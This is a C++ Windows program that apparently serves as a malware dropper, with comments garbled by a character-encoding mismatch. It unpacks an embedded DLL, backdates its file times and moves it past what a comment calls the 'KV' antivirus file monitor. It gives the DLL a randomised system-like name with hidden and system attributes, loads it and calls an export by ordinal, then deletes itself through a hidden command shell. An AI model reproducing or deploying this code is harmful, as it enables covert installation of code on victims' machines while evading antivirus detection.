// ConsoleApplication1.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "TLHELP32.H"
#include "resource.h"
#include <shellapi.h>

typedef int(__stdcall *lpAddFun)(int, int); //�궨�庯��ָ������

using namespace std;


int SEU_RandEx(int min, int max)
{
	if (min == max)
		return min;

	srand(GetTickCount());
	int seed = rand() + 3;

	return seed % (max - min + 1) + min;
}


BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFilePath)
{
	HGLOBAL hResData;
	HRSRC   hResInfo;
	HANDLE  hFile;
	DWORD   dwBytes;

	char tmpPath[MAX_PATH], outPath[MAX_PATH];

	// һ��Ҫ��������ֿ���GetTickCount�п��ܵõ�һ����ֵ


	GetTempPath(MAX_PATH, tmpPath);
	printf(tmpPath);

	//ϵͳ����ʱ�Ӽ���
	wsprintf(outPath, "%s\\%d_res.tmp", tmpPath, GetTickCount());

	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return FALSE;

	hResData = LoadResource(hModule, hResInfo);
	if (hResData == NULL) return FALSE;

	hFile = CreateFile(outPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL) return FALSE;

	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear = 2004;
	st.wMonth = 8;
	st.wDay = 17;
	st.wHour = 20;
	st.wMinute = 0;
	FILETIME ft, LocalFileTime;
	
	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft, &LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME)NULL, &LocalFileTime);

	WriteFile(hFile, hResData, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	CloseHandle(hFile);
	FreeResource(hResData);

	// Fuck KV File Create Monitor
	MoveFile(outPath, lpFilePath);
	SetFileAttributes(lpFilePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
	DeleteFile(outPath);

	return TRUE;
}


//�������ɾ������
void DelSelf()
{
	char szModule[MAX_PATH],
		szComspec[MAX_PATH],
		szParams[MAX_PATH];
	// �õ��ļ�·��:
	if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) &&
		(GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
		(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
	{
		// �����������
		wsprintf(szParams, " /c del %s > nul", szModule);
		lstrcat(szComspec, szParams);

		// ���ýṹ���Ա
		STARTUPINFO  si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		// Ϊ���������Դ
		::SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

		// ��������
		if (CreateProcess(0, szComspec, 0, 0, 0, CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// ��ͣ����ֱ�������˳�
			::SetPriorityClass(pi.hProcess, IDLE_PRIORITY_CLASS);
			::SetThreadPriority(pi.hThread, THREAD_PRIORITY_IDLE);
			// �ָ�������õ�����Ȩ
			::ResumeThread(pi.hThread);
			return;
		}
		else // ���������ʽ������Ŀռ�
		{
			::SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
			::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
		}
	}
}
//�����г����˿��ֽڵ����⣬���鷳 Tchar ���ǿ��ֽ�

int main()
{
	
	char mDllPath[MAX_PATH];
	char mCurrentPath[MAX_PATH];

	GetCurrentDirectory(MAX_PATH, mCurrentPath);
	printf(mCurrentPath);
	
	wsprintf(mDllPath, "%s\\S%cm%ct%cH.dll", mCurrentPath, SEU_RandEx('a', 'z'), SEU_RandEx('b', 'y'), SEU_RandEx('c', 'x'));
	printf(mDllPath);

	ReleaseResource(NULL, IDR_DLL1, "DLL", mDllPath);//�ͷ�DLL�ļ�
	
	//wsprintf(mDllPath, "%s\\..\\Debug\\Dllmain.dll", mCurrentPath);
	//printf(mDllPath);
	


	
	HMODULE mDllModule = LoadLibrary(mDllPath);
	if (mDllModule)
	{
		BOOL(_stdcall *addFunc)(int, int);
		//���庯�����͵�ָ�� �Խ��շ��صĺ�����ַ
		//__stdcall ����Ҫ ���򱨴�˵���Ͳ�ƥ��

		//(FARPROC&)addFunc = GetProcAddress(mDllModule, "add");
		//ͨ������������
		(FARPROC&)addFunc = GetProcAddress(mDllModule, MAKEINTRESOURCE(1));
		//ͨ��def�ļ��еĵ������ŵ����

		if (addFunc)
		{
			int result = addFunc(2, 26);
			printf("\ncall add in dll:%d\n", result);

		}
		FreeLibrary(mDllModule);
	}
	else
	{
		cout << "\n Dll load failed! \n";
		return 0;
	}

	DelSelf();
    return 0;
}

